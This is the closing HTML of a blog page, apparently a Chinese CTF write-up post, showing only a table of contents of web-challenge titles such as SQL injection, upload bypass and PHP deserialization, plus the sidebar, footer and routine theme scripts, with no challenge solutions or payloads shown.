href="#%E5%B1%82%E5%B1%82%E9%80%92%E8%BF%9B"><span class="toc-number">2.5.</span> <span class="toc-text">层层递进</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AAencode"><span class="toc-number">2.6.</span> <span class="toc-text">AAencode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E8%BA%AB20%E5%B9%B4"><span class="toc-number">2.7.</span> <span class="toc-text">单身20年</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-decode"><span class="toc-number">2.8.</span> <span class="toc-text">PHP decode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.9.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E8%BA%AB%E4%B8%80%E7%99%BE%E5%B9%B4%E4%B9%9F%E6%B2%A1%E7%94%A8"><span class="toc-number">2.10.</span> <span class="toc-text">单身一百年也没用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Download"><span class="toc-number">2.11.</span> <span class="toc-text">Download</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cookie"><span class="toc-number">2.12.</span> <span class="toc-text">cookie</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL"><span class="toc-number">2.13.</span> <span class="toc-text">MySQL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GBK-Injection"><span class="toc-number">2.14.</span> <span class="toc-text">GBK Injection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#x00"><span class="toc-number">2.15.</span> <span class="toc-text">&#x2F;x00</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#bypass-again"><span class="toc-number">2.15.1.</span> <span class="toc-text">bypass again</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">2.16.</span> <span class="toc-text">变量覆盖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E6%98%AF%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80"><span class="toc-number">2.17.</span> <span class="toc-text">PHP是世界上最好的语言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E8%A3%85%E8%80%85"><span class="toc-number">2.18.</span> <span class="toc-text">伪装者</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#header"><span class="toc-number">2.19.</span> <span class="toc-text">header</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87"><span class="toc-number">2.20.</span> <span class="toc-text">上传绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A51"><span class="toc-number">2.21.</span> <span class="toc-text">SQL注入1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pass-check"><span class="toc-number">2.22.</span> <span class="toc-text">pass check</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B5%B7%E5%90%8D%E5%AD%97%E7%9C%9F%E9%9A%BE"><span class="toc-number">2.23.</span> <span class="toc-text">起名字真难</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="toc-number">2.24.</span> <span class="toc-text">密码重置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">2.25.</span> <span class="toc-text">SQL Injection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E9%A2%98"><span class="toc-number">2.26.</span> <span class="toc-text">综合题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE2"><span class="toc-number">2.27.</span> <span class="toc-text">密码重置2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.28.</span> <span class="toc-text">PHP反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file-get-contents"><span class="toc-number">2.29.</span> <span class="toc-text">file_get_contents</span></a></li></ol></li></ol>
 
  </div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
<aside class="clearfix">

  


  
<div class="categorieslist">
	<p class="asidetitle">Categories</p>
		<ul>
		
		  
			<li><a href="/categories/CTF/" title="CTF">CTF<sup>10</sup></a></li>
		  
		
		  
			<li><a href="/categories/IoT/" title="IoT">IoT<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/Linux/" title="Linux">Linux<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/Other/" title="Other">Other<sup>24</sup></a></li>
		  
		
		  
			<li><a href="/categories/SQL/" title="SQL">SQL<sup>3</sup></a></li>
		  
		
		  
			<li><a href="/categories/Sec/" title="Sec">Sec<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/ctf/" title="ctf">ctf<sup>21</sup></a></li>
		  
		
		</ul>
</div>


  
<div class="tagslist">
	<p class="asidetitle">Tags</p>
		<ul class="clearfix">
		
			
				<li><a href="/tags/ctf/" title="ctf">ctf<sup>21</sup></a></li>
			
		
			
				<li><a href="/tags/buuctf/" title="buuctf">buuctf<sup>6</sup></a></li>
			
		
			
				<li><a href="/tags/Java/" title="Java">Java<sup>5</sup></a></li>
			
		
			
				<li><a href="/tags/SQLi/" title="SQLi">SQLi<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/SQL/" title="SQL">SQL<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/Linux/" title="Linux">Linux<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/PHP绕过/" title="PHP绕过">PHP绕过<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/MYSQL比较特性/" title="MYSQL比较特性">MYSQL比较特性<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/SSRF/" title="SSRF">SSRF<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/java-WEB-INF/" title="java-WEB-INF">java-WEB-INF<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/无参数RCE/" title="无参数RCE">无参数RCE<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/模板注入/" title="模板注入">模板注入<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/MISC/" title="MISC">MISC<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/IoT/" title="IoT">IoT<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/wifi密码破解/" title="wifi密码破解">wifi密码破解<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/安恒11月月赛/" title="安恒11月月赛">安恒11月月赛<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/cumt/" title="cumt">cumt<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/cumt双月赛一/" title="cumt双月赛一">cumt双月赛一<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/php变量覆盖/" title="php变量覆盖">php变量覆盖<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>1</sup></a></li>
			
		
		</ul>
</div>


  <div class="linkslist">
  <p class="asidetitle">Links</p>
    <ul>
        
          <li>
            
            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
            
          </li>
        
          <li>
            
            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
            
          </li>
        
    </ul>
</div>

  


  <div class="rsspart">
	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
</div>

  <div class="weiboshow">
  <p class="asidetitle">Weibo</p>
    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=&dpc=1"></iframe>
</div>


</aside>
</div>
    </div>
    <footer><div id="footer" >
	
	<div class="line">
		<span></span>
		<div class="author"></div>
	</div>
	
	
	<section class="info">
		<p> Good Good Study！ <br/>
			Day Day Up！</p>
	</section>
	 
	<div class="social-font" class="clearfix">
		
		
		
		
		
		
		
		
		
		
	</div>
			
		

		<p class="copyright">
		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2021 
		
		<a href="/about" target="_blank" title="John Doe">John Doe</a>
		
		
		</p>
</div>
</footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/jquery.qrcode-0.12.0.min.js"></script>

<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
  
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else{
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
      
      $('#toc.toc-aside').css('display', 'none');
        
    }
  });
});
</script>

<script type="text/javascript">
$(document).ready(function(){ 
  var ai = $('.article-content>iframe'),
      ae = $('.article-content>embed'),
      t  = $('#toc'),
      ta = $('#toc.toc-aside'),
      o  = $('.openaside'),
      c  = $('.closeaside');
  if(ai.length>0){
    ai.wrap('<div class="video-container" />');
  };
  if(ae.length>0){
   ae.wrap('<div class="video-container" />');
  };
  c.click(function(){
    ta.css('display', 'block').addClass('fadeIn');
  });
  o.click(function(){
    ta.css('display', 'none');
  });
  $(window).scroll(function(){
    ta.css("top",Math.max(140,320-$(this).scrollTop()));
  });
});
</script>


<script type="text/javascript">
$(document).ready(function(){ 
  var $this = $('.share'),
      url = $this.attr('data-url'),
      encodedUrl = encodeURIComponent(url),
      title = $this.attr('data-title'),
      tsina = $this.attr('data-tsina'),
      description = $this.attr('description');
  var html = [
  '<div class="hoverqrcode clearfix"></div>',
  '<a class="overlay" id="qrcode"></a>',
  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
  '<span title="Share to"></span>'
  ].join('');
  $this.append(html);

  $('.hoverqrcode').hide();

  var myWidth = 0;
  function updatehoverqrcode(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
    var qrsize = myWidth > 1024 ? 200:100;
    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
    var p = $('.article-share-qrcode').position();
    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
                          .qrcode(options);
  };
  $(window).resize(function(){
    $('.hoverqrcode').hide();
  });
  $('.article-share-qrcode').click(function(){
    updatehoverqrcode();
    $('.hoverqrcode').toggle();
  });
  $('.article-share-qrcode').hover(function(){}, function(){
      $('.hoverqrcode').hide();
  });
});   
</script>











<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.article-content').each(function(i){
    $(this).find('img').each(function(){
      if ($(this).parent().hasClass('fancybox')) return;
      var alt = this.alt;
      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
    });
    $(this).find('.fancybox').each(function(){
      $(this).attr('rel', 'article' + i);
    });
  });
  if($.fancybox){
    $('.fancybox').fancybox();
  }
}); 
</script>



<!-- Analytics Begin -->



<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>



<!-- Analytics End -->

<!-- Totop Begin -->

	<div id="totop">
	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
	</div>
	<script src="/js/totop.js"></script>

<!-- Totop End -->

<!-- MathJax Begin -->
<!-- mathjax config similar to math.stackexchange -->


<!-- MathJax End -->

<!-- Tiny_search Begin -->

<!-- Tiny_search End -->

  </body>
</html>
